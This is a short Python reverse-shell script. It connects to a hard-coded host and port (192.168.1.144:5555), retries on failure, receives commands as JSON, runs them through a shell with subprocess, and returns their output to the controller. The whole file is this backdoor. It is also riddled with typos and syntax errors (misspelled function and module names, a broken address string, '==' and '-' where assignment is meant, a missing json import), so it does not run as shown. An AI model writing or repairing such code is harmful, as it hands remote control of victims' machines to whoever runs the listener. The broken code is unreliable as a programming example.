import socket
import time
import subprocess

def relible_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def relible_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstip()
                        return json.loaads(data)
                except ValueError:
                        continue

def connection():
	while True:
		teme.sleep(20)
		try:
			s.connect(("192.168.1.144' 5555))
			shell()
			s.close()
			break
		except:
			connection()

def shell():
	while True:
		command == reliable_recv()
		if command == 'quit':
			break
		else:
			ececute = subprocess.Popen(command, shell=True. stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result - execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			relible_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
